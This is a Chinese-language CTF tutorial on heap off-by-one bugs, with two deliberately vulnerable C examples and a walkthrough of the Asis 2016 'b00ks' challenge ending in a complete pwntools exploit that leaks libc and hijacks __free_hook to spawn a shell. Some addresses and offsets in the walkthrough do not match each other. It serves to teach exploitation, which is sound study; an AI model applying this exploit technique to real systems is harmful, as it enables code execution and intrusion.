# Off-By-One漏洞
## 概述
- 严格来说`off-by-one`漏洞是一种特殊的溢出漏洞，`off-by-one`指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节

## 漏洞原理
- `off-by-one`是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的`size`正好就只多了一个字节的情况，其中边界验证不严通常包括：
  - 使用循环语句向堆块中写入数据时，循环的次数设置错误导致多写入了一个字节
  - 字符串操作不合适

- 一般来说，单字节溢出被认为是难以利用的，但是因为`Linux`的堆管理机制`ptmalloc`验证的松散性，基于`Linux`堆的`off-by-one`漏洞利用起来并不复杂，并且威力强大
- 此外，`off-by-one`是可以基于各种缓冲区的，比如栈、`bss`段等等，但是堆上的`off-by-one`是`CTF`中比较常见的

### 循环边界不严谨

- 在示例代码中，先创建了两个`char`类型的指针`chunk1`、`chunk2`，并且分别创建了两个`16`个字节的堆，接着向`input`函数中传入了指针和大小，即`chunk1`和`16`
- `input`函数的作用是从外界接收字符串并将字符串存放进`chunk1`的堆中，但是在循环存入数据的时候发生了边界不严谨的情况，`i`从`0`开始，但是`i <= size`，循环实际上是进行了`17`次，这就导致了`chunk1`会溢出一个字节

![](images/1.png#pic_center)

![](images/2.png#pic_center)

```c
int input(char *ptr, int size)
{
    int i;
    for(i = 0; i <= size; i++)
    {
        ptr[i] = getchar();
    }
    return i;
}
int main()
{
    char *chunk1, *chunk2;
    chunk1 = (char *)malloc(16);
    chunk2 = (char *)malloc(16);
    puts("Get Input:");
    input(chunk1, 16);
    return 0;
}
```

### 字符串操作不严谨

- 在示例代码中，先创建了一个`40`字节的字符串`buffer`，然后又创建了一个`24`字节的堆`chunk1`
- 接着从外部接收字符串并存放在字符串`buffer`中，然后判断`buffer`中的字符串的长度是否为`24`个字节，如果是将这段字符串放在堆中
- 在`strcpy`函数在拷贝的时候，会将结束符`\x00`存入堆块中，也就是说此时向`chunk1`中一共写了`25`个字节，这就导致了`chunk1`溢出了一个字节

![](images/3.png#pic_center)

![](images/4.png#pic_center)

```c
int main()
{
    char buffer[40] = "";
    void *chunk1;
    chunk1 = malloc(24);
    puts("Get Input");
    gets(buffer);
    if(strlen(buffer) == 24)
    {
        strcpy(chunk1, buffer);
    }
    return 0;
}
```

## CTF例题
### 静态分析

- [Asis_2016_b00ks](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks)
- 一道典型的菜单堆题，先输入作者名字，接着可以选择需要的功能：
  - `1.Create a book`
  - `2.Delete a book`
  - `3.Edit a book`
  - `4.Print book detail`
  - `5.Change current author name`
  - `6.Exit`

- 在创建作者名称函数中，可以看到其会调用函数`sub_9F5`，传入指针`off_202018`和数值`32`，且该函数实现的是向内存中写入的功能，在函数`sub_9F5`中可以看到，`a2`的值虽然是`32`，但是其没有对循环边界做严格限制，循环的实际执行次数为`33`次

```c
__int64 sub_B6D()
{
  printf("Enter author name: ");
  if ( !(unsigned int)sub_9F5(off_202018, 32) )
    return 0LL;
  printf("fail to read author_name");
  return 1LL;
}
```

```c
__int64 __fastcall sub_9F5(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)read(0, a1, 1uLL) != 1 )
      return 1LL;
    if ( *a1 == 10 )
      break;
    ++a1;
    if ( i == a2 )
      break;
  }
  *a1 = 0;
  return 0LL;
}
```

- 在创建书本的函数中，可以看到先需要输入书本名称的大小，并创建一个书名大小的堆，接着调用`sub_9F5`函数，向堆中写入书本名称并判断是否写入成功，接着同样的思路来写入书本内容，最后调用函数`sub_B24`，判断`off_202010 + i`指针的位置是否有值，没有的话返回`i`，并且该函数循环`20`次，因此最多只能创建`20`本书

```c
__int64 sub_F55()
{
  int v1; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+4h] [rbp-1Ch]
  void *v3; // [rsp+8h] [rbp-18h]
  void *ptr; // [rsp+10h] [rbp-10h]
  void *v5; // [rsp+18h] [rbp-8h]

  v1 = 0;
  printf("\nEnter book name size: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 )
    goto LABEL_2;
  printf("Enter book name (Max 32 chars): ");
  ptr = malloc(v1);
  if ( !ptr )
  {
    printf("unable to allocate enough space");
    goto LABEL_17;
  }
  if ( (unsigned int)sub_9F5(ptr, v1 - 1) )
  {
    printf("fail to read name");
    goto LABEL_17;
  }
  v1 = 0;
  printf("\nEnter book description size: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < 0 )
  {
LABEL_2:
    printf("Malformed size");
  }
  else
  {
    v5 = malloc(v1);
    if ( v5 )
    {
      printf("Enter book description: ");
      if ( (unsigned int)sub_9F5(v5, v1 - 1) )
      {
        printf("Unable to read description");
      }
      else
      {
        v2 = sub_B24();
        if ( v2 == -1 )
        {
          printf("Library is full");
        }
        else
        {
          v3 = malloc(0x20uLL);
          if ( v3 )
          {
            *((_DWORD *)v3 + 6) = v1;
            *((_QWORD *)off_202010 + v2) = v3;
            *((_QWORD *)v3 + 2) = v5;
            *((_QWORD *)v3 + 1) = ptr;
            *(_DWORD *)v3 = ++unk_202024;
            return 0LL;
          }
          printf("Unable to allocate book struct");
        }
      }
    }
    else
    {
      printf("Fail to allocate memory");
    }
  }
LABEL_17:
  if ( ptr )
    free(ptr);
  if ( v5 )
    free(v5);
  if ( v3 )
    free(v3);
  return 1LL;
}
```

```c
__int64 sub_B24()
{
  int i; // [rsp+0h] [rbp-4h]

  for ( i = 0; i <= 19; ++i )
  {
    if ( !*((_QWORD *)off_202010 + i) )
      return (unsigned int)i;
  }
  return 0xFFFFFFFFLL;
}
```

- 在删除书本的函数中，先输入书本的`id`，接着循环`20`次，在`off_202010`中寻找需要删除的书本，找到后调用`free`函数释放书本结构体中的每个结构

```c
__int64 sub_BBD()
{
  int v1; // [rsp+8h] [rbp-8h] BYREF
  int i; // [rsp+Ch] [rbp-4h]

  i = 0;
  printf("Enter the book id you want to delete: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0 )
  {
    for ( i = 0; i <= 19 && (!*((_QWORD *)off_202010 + i) || **((_DWORD **)off_202010 + i) != v1); ++i )
      ;
    if ( i != 20 )
    {
      free(*(void **)(*((_QWORD *)off_202010 + i) + 8LL));
      free(*(void **)(*((_QWORD *)off_202010 + i) + 16LL));
      free(*((void **)off_202010 + i));
      *((_QWORD *)off_202010 + i) = 0LL;
      return 0LL;
    }
    printf("Can't find selected book!");
  }
  else
  {
    printf("Wrong id");
  }
  return 1LL;
}
```

- 在编辑书本的函数中，先输入书本的`id`，接着循环`20`次，在`off_202010`中寻找需要编辑的书本，找到后调用`sub_9F5`函数将修改的内容重新写入

```c
__int64 sub_E17()
{
  int v1; // [rsp+8h] [rbp-8h] BYREF
  int i; // [rsp+Ch] [rbp-4h]

  printf("Enter the book id you want to edit: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 0 )
  {
    for ( i = 0; i <= 19 && (!*((_QWORD *)off_202010 + i) || **((_DWORD **)off_202010 + i) != v1); ++i )
      ;
    if ( i == 20 )
    {
      printf("Can't find selected book!");
    }
    else
    {
      printf("Enter new book description: ");
      if ( !(unsigned int)sub_9F5(
                            *(_BYTE **)(*((_QWORD *)off_202010 + i) + 16LL),
                            *(_DWORD *)(*((_QWORD *)off_202010 + i) + 24LL) - 1) )
        return 0LL;
      printf("Unable to read new description");
    }
  }
  else
  {
    printf("Wrong id");
  }
  return 1LL;
}
```

- 在打印书本的函数中，所有创建的书本都会被打印出来

```c
int sub_D1F()
{
  __int64 v0; // rax
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 19; ++i )
  {
    v0 = *((_QWORD *)off_202010 + i);
    if ( v0 )
    {
      printf("ID: %d\n", **((unsigned int **)off_202010 + i));
      printf("Name: %s\n", *(const char **)(*((_QWORD *)off_202010 + i) + 8LL));
      printf("Description: %s\n", *(const char **)(*((_QWORD *)off_202010 + i) + 16LL));
      LODWORD(v0) = printf("Author: %s\n", (const char *)off_202018);
    }
  }
  return v0;
}
```

### 动态分析
- 前面静态分析时知道了在`sub_9F5`函数中存在`off-by-one`漏洞，因此在创建作者名字时，先输入任意`32`个字节的字符串将存放作者名字的`off_202018`空间填满，然后`ctrl + c`进入调试界面，通过`vmmap`查看代码段的起始位置为`0x555555400000`，再次基础上加上`off_202018`的偏移即可找到存放作者名字的指针

![](images/5.png#pic_center)

- 可以看到`0x555555602018`中存放的是存放作者名字的地址`0x555555602040`，`0x555555602040`的位置正好就是刚才输入的`32`个字节的作者名字
- 也可以通过直接`search 字符串`的形式来确定字符串存放的位置

- 接着输入指令`c`回到程序执行界面，输入`1`创建两个图书：
  - `图书1`：书名大小`64`，书名随便写，内容大小`32`，内容随便写
  - `图书2`：书名大小`0x21000(135168)`，书名随便写，内容大小`0x21000(135168)`，内容随便写

- 接着输入命令`ctrl + c`回到调试界面，这次定位一下两个书结构体的位置，因为图书的结构体指针存放在`off_202010`中，所以还是用老方法数据段起始地址加上偏移`0x555555400000 + 0x202010 = 0x555555602010`

![](images/6.png#pic_center)

- 可以看到`0x555555602010`中存放的就是`图书1`的结构体指针，紧跟着的就是`图书2`的结构体指针，还有一点需要注意的是之前输入的作者名字紧跟在两个结构体指针前面，这是因为存放这两个东西的`off_202010`和`off_202018`是挨着的，并且`book1`结构体指针的低位`70`覆盖了之前的结束符`\x00`
- 打印作者名字时，最后的`\x00`也是要输出的，但是被`70`覆盖之后`70`也会被打印，由于`70`是`book1`结构体指针的起始位置，那么`book1`结构体指针也会被一起打印出来，这就像两张扑克牌`牌A`和`牌B`，`牌A`放在桌子上，`牌B`的边缘涂上胶水，接着将`牌B`有胶水的一面边缘放在`牌A`的边缘使两张牌黏在一起，最后从桌子上拿起`牌A`，由于`牌A`与`牌B`粘合的原因，`牌B`也会跟着被从桌子上拿起

![](images/7.png#pic_center)

- 此时如果再次修改作者名字，会导致`book1`结构体指针`0x555555603770`被覆盖为`0x555555603700`，而`0x555555757700`的位置就是刚才`book1_description`的位置，这也是为什么要将`book1_size`设置成`64`的原因

![](images/8.png#pic_center)

- 通过`\x00`覆盖之后原有的结构体指针变成了`0x555555603700`，那么程序就会去`0x555555603700`的位置寻找结构体。如果我们在原有的`book1`的`book1_description`的位置伪造一个结构体，然后在进行`\x00`覆盖，那么就把伪造的结构体当做`book1`来实现

![](images/9.png#pic_center)

- 堆有两种拓展方式一种是`brk`会直接拓展原来的堆，另一种是`mmap`会单独映射一块内存，`book2`的`size`要设置为`135168`是因为申请一个超大块的空间，使得堆以`mmap`的形式进行扩展，那么`mmap`申请的这个空间会以单独的段形式表示
- 在这里申请一个超大的块，来使用`mmap`扩展内存，因为`mmap`分配的内存与`libc`之前存在固定的偏移，因此如果此时能够泄露`book2_name`的地址或者`book2_description`的地址，便可以推算出`libc`的基地址

```
fake_book1_name = book2_name
book2_name - book1_addr = 0x555555603768 - 0x555555603730 = 0x38
fake_book1_name = book1_addr + 0x38

fake_book1_description = book2_description
book2_description - book1_addr = 0x555555603770 - 0x555555757730 = 0x40
fake_book1_description = book1_addr + 0x40
```

- 根据上面的计算，可以构造`fake_book1`结构体为：`payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)`
- 部署好结构体之后还需要重新修改一下作者名，因为伪造的结构体是写在原`book1_description`中的，所以按照攻击流程上来说应该先部署伪造的结构体，然后再使用`\x00`覆盖`book1`结构体指针，使指针指向伪造的结构体，这样一来按`c`回到程序执行流程，先修改作者名字，然后再次执行打印功能，就会将`book2_name`和`book2_description`打印出来

![](images/10.png#pic_center)

- 接着就是计算`libc`基地址、`freehook`地址、`onegadget`找`gadget`等一系列操作

![](images/11.png#pic_center)

- 最后`getshell`的思路为，先向伪造的结构体`fake_book1`的`description`中部署`free_hook`，然后向`book2`的`description`中写入`onegadget`，最后在释放`book2`的时候就可以触发`execve('/bin/sh')`

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

r = process('./b00ks')
elf = ELF('b00ks')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create_author(name):
    r.recvuntil(b'Enter author name: ')
    r.sendline(name)

def create_book(name_size, name, description_size, description):
    r.recvuntil(b'>')
    r.sendline(b'1')
    r.recvuntil(b'Enter book name size: ')
    r.sendline(name_size)
    r.recvuntil(b'Enter book name (Max 32 chars): ')
    r.sendline(name)
    r.recvuntil(b'Enter book description size: ')
    r.sendline(description_size)
    r.recvuntil(b'Enter book description: ')
    r.sendline(description)
    log.info('create book')

def delete_book(index):
    r.recvuntil(b'>')
    r.sendline(b'2')
    r.recvuntil(b'Enter the book id you want to delete: ')
    r.sendline(index)
    log.info('delete book')

def edit_book(index, description):
    r.recvuntil(b'>')
    r.sendline(b'3')
    r.recvuntil(b'Enter the book id you want to edit: ')
    r.sendline(index)
    r.recvuntil(b'Enter new book description: ')
    r.sendline(description)
    log.info('edit book')

def print_book(index):
    r.recvuntil(b'>')
    r.sendline(b'4')
    for i in range(index):
        r.recvuntil(b': ')
        book_id = r.recvline()[:-1]
        r.recvuntil(b': ')
        book_name = r.recvline()[:-1]
        r.recvuntil(b': ')
        book_description = r.recvline()[:-1]
        r.recvuntil(b': ')
        book_author = r.recvline()[:-1]
    log.info('print book')
    return book_id, book_name, book_description, book_author

def change_author(name):
    r.recvuntil(b'>')
    r.sendline(b'5')
    r.recvuntil(b'Enter author name: ')
    r.sendline(name)
    log.info('change author')

create_author(b'a' * 32)
create_book(b'64', b'book1', b'32', b'book1 description')
create_book(b'135168', b'book2', b'135168', b'book2 description')

book_id_1, book_name_1, book_description_1, book_author_1 = print_book(1)
book1_addr = u64(book_author_1[32:32+6].ljust(8, b'\x00'))
log.success('book1 address: ' + hex(book1_addr))

payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)
edit_book(b'1', payload)
change_author(b'a' * 32)

book_id_1, book_name_1, book_description_1, book_author_1 = print_book(1)
book2_name = u64(book_name_1.ljust(8, b'\x00'))
book2_description = u64(book_description_1.ljust(8, b'\x00'))
log.success('book2 name address: ' + hex(book2_name))
log.success('book2 description address: ' + hex(book2_description))

libc_base = book2_description + 0x43FF0
log.success('libc base: ' + hex(libc_base))

free_hook = libc_base + libc.symbols['__free_hook']
onegadget = libc_base + 0xE3B04
edit_book(b'1', p64(free_hook))
edit_book(b'2', p64(onegadget))
gdb.attach(r)
delete_book(b'2')

r.interactive()
```